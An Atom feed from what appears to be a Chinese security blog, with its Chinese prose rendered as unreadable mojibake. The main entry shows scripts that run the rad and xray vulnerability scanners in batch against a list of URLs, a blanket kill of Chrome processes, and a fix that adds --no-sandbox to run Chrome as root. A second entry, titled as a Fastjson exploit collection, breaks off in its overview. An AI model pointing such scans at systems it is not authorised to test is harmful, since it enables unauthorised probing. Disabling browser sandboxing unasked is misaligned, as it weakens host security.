<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ä¸°æ¢“æ—çš„åšå®¢</title>
  <icon>https://fz1lin.com/icon.png</icon>
  <subtitle>æƒ³åšä¸€ä¸ªå‰‘å®¢ï¼Œä½†æ‰‹é‡Œæ²¡æœ‰åˆé€‚çš„å‰‘</subtitle>
  <link href="https://fz1lin.com/atom.xml" rel="self"/>
  
  <link href="https://fz1lin.com/"/>
  <updated>2022-08-26T10:03:07.905Z</updated>
  <id>https://fz1lin.com/</id>
  
  <author>
    <name>fz1lin</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>rad+xrayåœ¨Linuxè¿è¡Œçš„è¸©å‘è®°å½•</title>
    <link href="https://fz1lin.com/2022/794027888/"/>
    <id>https://fz1lin.com/2022/794027888/</id>
    <published>2022-02-24T12:44:31.000Z</published>
    <updated>2022-08-26T10:03:07.905Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-å®‰è£…-xray-å’Œ-rad"><a href="#0x01-å®‰è£…-xray-å’Œ-rad" class="headerlink" title="0x01 å®‰è£… xray å’Œ rad"></a>0x01 å®‰è£… xray å’Œ rad</h2><p>ç‰ˆæœ¬ 1.0 åŸºç¡€åŠŸèƒ½ 2022.2.24</p><p>ç‰ˆæœ¬ 2.0 å¢åŠ  screen 2022.8.13</p><p>è¿è¡Œç¯å¢ƒ</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">centos</span> <span class="number">7</span></span><br></pre></td></tr></table></figure><p>xray <a href="https://github.com/chaitin/xray">https://github.com/chaitin/xray</a></p><p>rad <a href="https://github.com/chaitin/rad">https://github.com/chaitin/rad</a></p><p>å®‰è£…å°±ä¸ç”¨å¤šè¯´äº†ï¼Œå®‰è£…Linuxç‰ˆçš„å°±è¡Œäº†</p><h2 id="0x02-è¿è¡Œè„šæœ¬"><a href="#0x02-è¿è¡Œè„šæœ¬" class="headerlink" title="0x02 è¿è¡Œè„šæœ¬"></a>0x02 è¿è¡Œè„šæœ¬</h2><p>è„šæœ¬ä»‹ç»ï¼šrad+xray èåˆï¼Œæ¢æµ‹æ‰¹é‡ç›®æ ‡</p><p>è¿™ä¸ªè„šæœ¬æ˜¯åœ¨ windowä¸‹è¿è¡Œçš„ï¼Œæ‰€ä»¥ä½ è¦æŠŠxray.exeè¯¥æˆä½ Linuxç‰ˆxrayçš„åå­—</p><p>æ ¹æ®ä½ è‡ªå·±éœ€è¦é€‰æ‹©å³å¯</p><p><a href="https://github.com/timwhitez/rad-xray">https://github.com/timwhitez/rad-xray</a></p><p>è¿è¡Œè„šæœ¬ä¼šå‘ç°å‡ºç°é”™è¯¯ï¼Œno chrome foundï¼Œå› ä¸º rad è¿è¡Œéœ€è¦ chrome æµè§ˆå™¨ï¼Œæ‰€ä»¥è¦å®‰è£…chromeæµè§ˆå™¨</p><p>é˜²è„šæœ¬ä¸¢å¤±-å°†åŸæ–‡è´´è¿‡æ¥äº†ï¼ˆå¦‚æœ‰ä¾µæƒè¯·é‚®ç®±è”ç³»æˆ‘åˆ é™¤ï¼‰ã€‚</p><h3 id="ç¤¾åŒºç‰ˆç”¨æˆ·"><a href="#ç¤¾åŒºç‰ˆç”¨æˆ·" class="headerlink" title="ç¤¾åŒºç‰ˆç”¨æˆ·"></a>ç¤¾åŒºç‰ˆç”¨æˆ·</h3><p>urlä¸€è¡Œä¸€ä¸ªæ”¾url.txtä¸­ï¼Œå’Œradæ”¾åŒæ–‡ä»¶å¤¹</p><p>xrayå¼€å¯ç›‘å¬ï¼Œ</p><p>./xray webscan â€“listen 127.0.0.1:7777 â€“html-output report__datetime__.html</p><p>è¿è¡Œpy</p><p>python3 rad+xray.py</p><p>æ³¨æ„ï¼šå•ä¸ªä»»åŠ¡ç»“æŸåä¼škillæ‰€æœ‰çš„chromeè¿›ç¨‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">data1</span>):</span></span><br><span class="line">target = data1</span><br><span class="line"><span class="built_in">print</span>(target + <span class="string">&quot; Start Crawling&quot;</span>)</span><br><span class="line">cmd = [<span class="string">&quot;./rad&quot;</span>,<span class="string">&quot;-t&quot;</span>,target,<span class="string">&quot;--auto-index&quot;</span>, <span class="string">&quot;--http-proxy&quot;</span>, <span class="string">&quot;127.0.0.1:7777&quot;</span>, <span class="string">&quot;--no-banner&quot;</span>]</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">output = subprocess.check_output(cmd, timeout=<span class="number">3600</span>)</span><br><span class="line"><span class="built_in">print</span>(output.decode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"><span class="comment">#print(e)</span></span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">sysstr = platform.system()</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;url.txt&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> text <span class="keyword">in</span> file.readlines():</span><br><span class="line">data1=text.strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">main(data1)</span><br><span class="line"><span class="built_in">print</span>(data1 + <span class="string">&quot; Finish&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">10</span>)</span><br><span class="line"><span class="comment">#æ¸…é™¤å¤šä½™æµè§ˆå™¨è¿›ç¨‹</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">if</span>(sysstr ==<span class="string">&quot;Windows&quot;</span>):</span><br><span class="line">os.system(<span class="string">&quot;taskkill /f /IM chrome*&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span>(sysstr ==<span class="string">&quot;Linux&quot;</span>):</span><br><span class="line">os.system(<span class="string">&quot;ps aux | awk &#x27;/chrome/ &#123; print $2 &#125; &#x27; | xargs kill -9&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h3 id="é«˜çº§ç‰ˆç”¨æˆ·"><a href="#é«˜çº§ç‰ˆç”¨æˆ·" class="headerlink" title="é«˜çº§ç‰ˆç”¨æˆ·"></a>é«˜çº§ç‰ˆç”¨æˆ·</h3><p>urlä¸€è¡Œä¸€ä¸ªæ”¾url.txtä¸­</p><p>xray+rad.py å’Œ xray å’Œ rad æ”¾åŒä¸€æ–‡ä»¶å¤¹</p><p>è¿è¡Œpy:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 xray+rad.py</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">data1</span>):</span></span><br><span class="line">target = data1</span><br><span class="line">cmd = [<span class="string">&quot;./xray&quot;</span>,<span class="string">&quot;webscan&quot;</span>,<span class="string">&quot;--browser-crawler&quot;</span>,target,<span class="string">&quot;--html-output&quot;</span> ,<span class="string">&quot;report__datetime__.html&quot;</span>]</span><br><span class="line">rsp=subprocess.Popen(cmd)</span><br><span class="line">output, error = rsp.communicate()</span><br><span class="line"><span class="built_in">print</span>(output)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;url.txt&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> text <span class="keyword">in</span> file.readlines():</span><br><span class="line">data1=text.strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">main(data1)</span><br></pre></td></tr></table></figure><h3 id="è§£å†³æ–¹æ¡ˆ"><a href="#è§£å†³æ–¹æ¡ˆ" class="headerlink" title="è§£å†³æ–¹æ¡ˆ"></a>è§£å†³æ–¹æ¡ˆ</h3><p>å®‰è£…  <a href="https://www.google.com/chrome/?platform=linux">Chrome</a></p><p>centos7 å®‰è£…</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">wget https://dl.google.com/linux/direct/google-chrome-stable_current_x86_64.rpm</span><br><span class="line">yum install -y google-chrome-stable_current_x86_64.rpm</span><br><span class="line">yum install libpcap-devel -y</span><br><span class="line">cp /usr/lib64/libpcap.so /usr/lib64/libpcap.so.0.8</span><br><span class="line">yum update glib2 -y </span><br><span class="line"></span><br><span class="line"><span class="comment"># æµ‹è¯•å®‰è£…</span></span><br><span class="line">/opt/google/chrome/chrome --version</span><br><span class="line"></span><br><span class="line"><span class="comment">#å¸è½½Googleæµè§ˆå™¨</span></span><br><span class="line">yum autoremove -y google-chrome</span><br></pre></td></tr></table></figure><p>ubuntu å®‰è£…</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb</span><br><span class="line">sudo apt install ./google-chrome-stable_current_amd64.deb</span><br></pre></td></tr></table></figure><p>å†æ¬¡è¿è¡Œxrayä½ ä¼šå‘ç°åˆå‡ºç°é”™è¯¯äº†ï¼Œ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[launcher] Failed to get the debug url: [0224/025251.434358:ERROR:zygote_host_impl_linux.cc(90)] Running as root without --no-sandbox is not supported. See https://crbug.com/638180.</span><br></pre></td></tr></table></figure><p>åŸå› æ˜¯chromeçš„æ²™ç®±é—®é¢˜ï¼Œä¸èƒ½ä»¥rootç”¨æˆ·è¿è¡Œã€‚</p><h3 id="è§£å†³æ–¹æ¡ˆ-1"><a href="#è§£å†³æ–¹æ¡ˆ-1" class="headerlink" title="è§£å†³æ–¹æ¡ˆ"></a>è§£å†³æ–¹æ¡ˆ</h3><p>ä¿®æ”¹ /usr/bin/ ç›®å½•ä¸‹çš„ google-chrome é…ç½®æ–‡ä»¶</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">vim /usr/bin/google-chrome</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">æ‰¾åˆ°å¦‚ä¸‹</span></span><br><span class="line">exec -a &quot;$0&quot; &quot;$HERE/chrome&quot; &quot;$@&quot;</span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">exec</span> -a <span class="string">&quot;<span class="variable">$0</span>&quot;</span> <span class="string">&quot;<span class="variable">$HERE</span>/chrome&quot;</span> <span class="string">&quot;<span class="variable">$@</span>&quot;</span> æ³¨é‡Šæ‰</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">æ·»åŠ </span></span><br><span class="line">exec -a &quot;$0&quot; &quot;$HERE/chrome&quot; &quot;$@&quot; --user-data-dir --no-sandbox</span><br></pre></td></tr></table></figure><p>é‡æ–°è¿è¡Œxrayè„šæœ¬å³å¯</p><h2 id="0x03-æ‰©å±•ï¼šè„šæœ¬åå°è¿è¡Œ"><a href="#0x03-æ‰©å±•ï¼šè„šæœ¬åå°è¿è¡Œ" class="headerlink" title="0x03 æ‰©å±•ï¼šè„šæœ¬åå°è¿è¡Œ"></a>0x03 æ‰©å±•ï¼šè„šæœ¬åå°è¿è¡Œ</h2><p>å¦‚æœä¸ä½¿ç”¨æ­¤å‘½ä»¤ï¼Œå¦‚æœæ–­å¼€ shell ç»ˆç«¯ï¼Œä»»åŠ¡ä¼šç»“æŸ</p><p>å…·ä½“çš„å¯ä»¥å‚è€ƒè¿™ä¸ª <a href="https://www.runoob.com/linux/linux-comm-nohup.html">nohup</a></p><h3 id="åå°è¿è¡Œæ–¹å¼ä¸€ï¼šnohup"><a href="#åå°è¿è¡Œæ–¹å¼ä¸€ï¼šnohup" class="headerlink" title="åå°è¿è¡Œæ–¹å¼ä¸€ï¼šnohup"></a>åå°è¿è¡Œæ–¹å¼ä¸€ï¼šnohup</h3><p>1.åå°è¿è¡Œ</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup <span class="keyword">python3</span> browerscan.<span class="keyword">py</span> &amp;</span><br></pre></td></tr></table></figure><p>2.æŸ¥çœ‹é¡¹ç›®ç”Ÿæˆçš„æ•°æ®</p><blockquote><p>åŠ¨æ€æ˜¾ç¤ºæ•°æ®è¿›ç¨‹</p></blockquote><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">tail</span> -f nohup.txt</span><br></pre></td></tr></table></figure><p>3.æŸ¥çœ‹åå°è¿è¡Œ</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ps</span> -aux | <span class="keyword">grep</span> <span class="keyword">python3</span></span><br></pre></td></tr></table></figure><p>4.æ€æ­»åå°</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ps</span> -aux | <span class="keyword">grep</span> <span class="keyword">python3</span> </span><br><span class="line">kill <span class="keyword">python3</span>çš„UID</span><br></pre></td></tr></table></figure><h3 id="åå°è¿è¡Œæ–¹å¼äºŒï¼šscreenï¼ˆæ¨èï¼‰"><a href="#åå°è¿è¡Œæ–¹å¼äºŒï¼šscreenï¼ˆæ¨èï¼‰" class="headerlink" title="åå°è¿è¡Œæ–¹å¼äºŒï¼šscreenï¼ˆæ¨èï¼‰"></a>åå°è¿è¡Œæ–¹å¼äºŒï¼šscreenï¼ˆæ¨èï¼‰</h3><p>ç³»ç»Ÿç®¡ç†å‘˜ç»å¸¸éœ€è¦SSH æˆ–è€…telent è¿œç¨‹ç™»å½•åˆ°Linux æœåŠ¡å™¨ï¼Œç»å¸¸è¿è¡Œä¸€äº›éœ€è¦å¾ˆé•¿æ—¶é—´æ‰èƒ½å®Œæˆçš„ä»»åŠ¡ï¼Œæ¯”å¦‚ç³»ç»Ÿå¤‡ä»½ã€ftp ä¼ è¾“ç­‰ç­‰ã€‚é€šå¸¸æƒ…å†µä¸‹æˆ‘ä»¬éƒ½æ˜¯ä¸ºæ¯ä¸€ä¸ªè¿™æ ·çš„ä»»åŠ¡å¼€ä¸€ä¸ªè¿œç¨‹ç»ˆç«¯çª—å£ï¼Œå› ä¸ºå®ƒä»¬æ‰§è¡Œçš„æ—¶é—´å¤ªé•¿äº†ã€‚å¿…é¡»ç­‰å¾…å®ƒä»¬æ‰§è¡Œå®Œæ¯•ï¼Œåœ¨æ­¤æœŸé—´ä¸èƒ½å…³æ‰çª—å£æˆ–è€…æ–­å¼€è¿æ¥ï¼Œå¦åˆ™è¿™ä¸ªä»»åŠ¡å°±ä¼šè¢«æ€æ‰ã€‚</p><p>å‚è€ƒé“¾æ¥ <a href="https://www.cnblogs.com/mchina/archive/2013/01/30/2880680.html">https://www.cnblogs.com/mchina/archive/2013/01/30/2880680.html</a></p><p>å®‰è£…</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># centos ç±»å‹</span></span><br><span class="line">yum install screen -y</span><br><span class="line"></span><br><span class="line"><span class="comment"># Ubuntu ç±»å‹</span></span><br><span class="line">sudo apt-get install screen -y</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åˆ›å»ºæ–¹å¼</span></span><br><span class="line">screen         <span class="comment"># ç›´æ¥è¿›å…¥ä¼šè¯</span></span><br><span class="line"></span><br><span class="line">screen -S <span class="built_in">test</span> <span class="comment"># åˆ›å»ºä¸€ä¸ªscreen åå­—ä¸º test</span></span><br><span class="line"></span><br><span class="line">screen vi test.txt <span class="comment"># ä¼šè¯åˆ†ç¦»ä¸æ¢å¤</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç¦»å¼€ä¼šè¯è¿˜å¯ä»¥æ¢å¤</span></span><br><span class="line">ctrl+aï¼Œd</span><br><span class="line"></span><br><span class="line"><span class="comment"># å…³é—­ä¼šè¯</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥è¯¢</span></span><br><span class="line">screen -ls  <span class="comment"># æ˜¾ç¤ºå·²åˆ›å»ºçš„screenç»ˆç«¯</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿æ¥</span></span><br><span class="line">screen -r 2276 <span class="comment"># è¿æ¥ screen_id ä¸º 2276 </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ¸…é™¤ä¼šè¯</span></span><br><span class="line">screen -wipe  <span class="comment"># æ¸…é™¤ dead çŠ¶æ€</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ¢å¤å‡ºç°é—®é¢˜</span></span><br><span class="line"><span class="comment"># æœ‰æ—¶åœ¨æ¢å¤screenæ—¶ä¼šå‡ºç°There is no screen to be resumed matching ****</span></span><br><span class="line">screen -d ****</span><br><span class="line"></span><br><span class="line"><span class="comment"># å½“å‡†å¤‡ä¸‹è½½çš„æ—¶å€™ä¼šå‡ºç°è¿™ä¸ª ï¼Œè§£å†³æ–¹æ¡ˆ æŒ‰äº”ä¸‹ Ctrl + X ,ç„¶åç¦»å¼€ä¼šè¯ Ctrl + aï¼Œd ï¼Œåœ¨æ‰§è¡Œsz test.txt</span></span><br><span class="line">[root@localhost ~]<span class="comment"># sz test.txt </span></span><br><span class="line">ï¿½*B00000000000000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># screenæ¨¡å¼æ— æ³•ç¿»é¡µï¼Œé¼ æ ‡æ— æ³•æ»šåŠ¨é—®é¢˜</span></span><br><span class="line">å…ˆæŒ‰Ctrl+aé”®ï¼Œç„¶åé‡Šæ”¾ï¼Œç„¶åå†æŒ‰[é”®å³å¯è¿›å…¥ç¿»é¡µæ¨¡å¼ã€‚ä½¿ç”¨é¼ æ ‡å¯ä»¥æ»šåŠ¨</span><br><span class="line"></span><br><span class="line">åˆ‡å›ä¹‹å‰æ¨¡å¼</span><br><span class="line">Ctrl+c </span><br></pre></td></tr></table></figure><p>å¿«æ·é”®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Ctrl + aï¼Œd   <span class="comment">#æš‚ç¦»å½“å‰ä¼šè¯</span></span><br><span class="line">Ctrl + aï¼Œc   <span class="comment">#åœ¨å½“å‰screenä¼šè¯ä¸­åˆ›å»ºä¸€ä¸ªå­ä¼šè¯</span></span><br><span class="line">Ctrl + aï¼Œw   <span class="comment">#å­ä¼šè¯åˆ—è¡¨</span></span><br><span class="line">Ctrl + aï¼Œp   <span class="comment">#ä¸Šä¸€ä¸ªå­ä¼šè¯</span></span><br><span class="line">Ctrl + aï¼Œn   <span class="comment">#ä¸‹ä¸€ä¸ªå­ä¼šè¯</span></span><br><span class="line">Ctrl + aï¼Œ0-9 <span class="comment">#åœ¨ç¬¬0çª—å£è‡³ç¬¬9å­ä¼šè¯é—´åˆ‡æ¢</span></span><br></pre></td></tr></table></figure><p>æ‰€æœ‰å‘½ä»¤å‚æ•°</p><ul><li>ğŸ’š screenæ‰€æœ‰å‘½ä»¤å‚æ•°</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-A ã€€å°†æ‰€æœ‰çš„è§†çª—éƒ½è°ƒæ•´ä¸ºç›®å‰ç»ˆç«¯æœºçš„å¤§å°ã€‚</span><br><span class="line">-d &lt;ä½œä¸šåç§°&gt; ã€€å°†æŒ‡å®šçš„screenä½œä¸šç¦»çº¿ã€‚</span><br><span class="line">-h &lt;è¡Œæ•°&gt; ã€€æŒ‡å®šè§†çª—çš„ç¼“å†²åŒºè¡Œæ•°ã€‚</span><br><span class="line">-m ã€€å³ä½¿ç›®å‰å·²åœ¨ä½œä¸šä¸­çš„screenä½œä¸šï¼Œä»å¼ºåˆ¶å»ºç«‹æ–°çš„screenä½œä¸šã€‚</span><br><span class="line">-r &lt;ä½œä¸šåç§°&gt; ã€€æ¢å¤ç¦»çº¿çš„screenä½œä¸šã€‚</span><br><span class="line">-R ã€€å…ˆè¯•å›¾æ¢å¤ç¦»çº¿çš„ä½œä¸šã€‚è‹¥æ‰¾ä¸åˆ°ç¦»çº¿çš„ä½œä¸šï¼Œå³å»ºç«‹æ–°çš„screenä½œä¸šã€‚</span><br><span class="line">-s ã€€æŒ‡å®šå»ºç«‹æ–°è§†çª—æ—¶ï¼Œæ‰€è¦æ‰§è¡Œçš„shellã€‚</span><br><span class="line">-S &lt;ä½œä¸šåç§°&gt; ã€€æŒ‡å®šscreenä½œä¸šçš„åç§°ã€‚</span><br><span class="line">-v ã€€æ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯ã€‚</span><br><span class="line">-x ã€€æ¢å¤ä¹‹å‰ç¦»çº¿çš„screenä½œä¸šã€‚</span><br><span class="line">-lsæˆ–--list ã€€æ˜¾ç¤ºç›®å‰æ‰€æœ‰çš„screenä½œä¸šã€‚</span><br><span class="line">-wipe ã€€æ£€æŸ¥ç›®å‰æ‰€æœ‰çš„screenä½œä¸šï¼Œå¹¶åˆ é™¤å·²ç»æ— æ³•ä½¿ç”¨çš„screenä½œä¸šã€‚</span><br></pre></td></tr></table></figure><p>å‚è€ƒé“¾æ¥</p><p><a href="https://github.com/timwhitez/rad-xray">https://github.com/timwhitez/rad-xray</a></p><p><a href="https://blog.csdn.net/yelllowcong/article/details/80159963">https://blog.csdn.net/yelllowcong/article/details/80159963</a></p><p><a href="https://blog.csdn.net/weixin_42250835/article/details/119983347">https://blog.csdn.net/weixin_42250835/article/details/119983347</a></p>]]></content>
    
    
    <summary type="html">åœ¨å·¥ä½œä¸­æ‰¹é‡å¤„ç†é‡åˆ°çš„é—®é¢˜ï¼Œrad+xrayåœ¨Linuxä¸‹è¿è¡Œçš„è®°å½•</summary>
    
    
    
    <category term="è¸©å‘è®°å½•" scheme="https://fz1lin.com/categories/%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95/"/>
    
    
    <category term="ç¯å¢ƒ" scheme="https://fz1lin.com/tags/%E7%8E%AF%E5%A2%83/"/>
    
    <category term="Linux" scheme="https://fz1lin.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Fastjsonæ¼æ´åˆ©ç”¨åˆé›†</title>
    <link href="https://fz1lin.com/2022/498480683/"/>
    <id>https://fz1lin.com/2022/498480683/</id>
    <published>2022-08-19T13:19:14.000Z</published>
    <updated>2022-08-20T02:37:03.163Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-Fastjson-æ¦‚è¿°"><a href="#0x01-Fastjson-æ¦‚è¿°" class="headerlink" title="0x01 Fastjson æ¦‚è¿°"></a>0x01 Fastjson æ¦‚è¿°</h1><h2 id="1-åº”ç”¨åœºæ™¯"><a href="#1-åº”ç”¨åœºæ™¯" class="headerlink" title="1.åº”ç”¨åœºæ™¯"></a>1.åº”ç”¨åœºæ™¯</h2><h3 id="æ¥å£è¿”å›æ•°æ®"><a href="#æ¥å£è¿”å›æ•°æ®" class="headerlink" title="æ¥å£è¿”å›æ•°æ®"></a>æ¥å£è¿”å›æ•°æ®</h3><ol><li>Ajaxå¼‚æ­¥è®¿é—®æ•°æ®</li><li>RPCè¿œç¨‹è°ƒç”¨</li><li>å‰åç«¯åˆ†ç¦»åç«¯è¿”å›çš„æ•°æ®</li><li>å¼€æ”¾API(ä¸€äº›å…¬å¸å¼€æ”¾æ¥å£çš„æ—¶å€™ï¼Œæˆ‘ä»¬ç‚¹å‡»è¯·æ±‚ï¼Œè¿”å›çš„æ•°æ®æ˜¯JSONæ ¼å¼çš„)</li><li>ä¼ä¸šé—´åˆä½œæ¥å£(æ•°æ®å¯¹æ¥çš„æ—¶å€™å®šä¹‰çš„ä¸€ç§è§„èŒƒï¼Œç¡®å®šå…¥å‚ï¼Œå‡ºå·®)</li></ol><h3 id="åºåˆ—åŒ–"><a href="#åºåˆ—åŒ–" class="headerlink" title="åºåˆ—åŒ–"></a>åºåˆ—åŒ–</h3><p>å°†å¯¹è±¡æ•°æ®è½¬æ¢ä¸ºJSONæ ¼å¼ï¼Œåˆ©ç”¨JSONæ¥å®ç°åºåˆ—åŒ–å­˜å‚¨åœ¨ç£ç›˜ä¸­ã€‚</p><h3 id="ç”ŸæˆToken"><a href="#ç”ŸæˆToken" class="headerlink" title="ç”ŸæˆToken"></a>ç”ŸæˆToken</h3><p>ä¹Ÿå°±æ˜¯ä½¿ç”¨jsonå°†ä¸€äº›æ•°æ®å°è£…èµ·æ¥å½“åšè®¿é—®ä¸€äº›åº”ç”¨çš„ä»¤ç‰Œã€‚</p><h3 id="ä½œä¸ºé…ç½®æ–‡ä»¶"><a href="#ä½œä¸ºé…ç½®æ–‡ä»¶" class="headerlink" title="ä½œä¸ºé…ç½®æ–‡ä»¶"></a>ä½œä¸ºé…ç½®æ–‡ä»¶</h3><p>egï¼š<code>npmçš„package.json</code>åŒ…ç®¡ç†é…ç½®æ–‡ä»¶</p><p>ä¸è¿‡ä¸€èˆ¬æƒ…å†µä¸‹ä½¿ç”¨jsonä½œä¸ºé…ç½®æ–‡ä»¶çš„æƒ…å†µå¾ˆå°‘ï¼Œå¹¶ä¸å»ºè®®ä½¿ç”¨ã€‚</p><p><a href="https://www.codeleading.com/article/82974738889/">https://www.codeleading.com/article/82974738889/</a></p><h2 id="2-é»‘ç›’æµ‹è¯•"><a href="#2-é»‘ç›’æµ‹è¯•" class="headerlink" 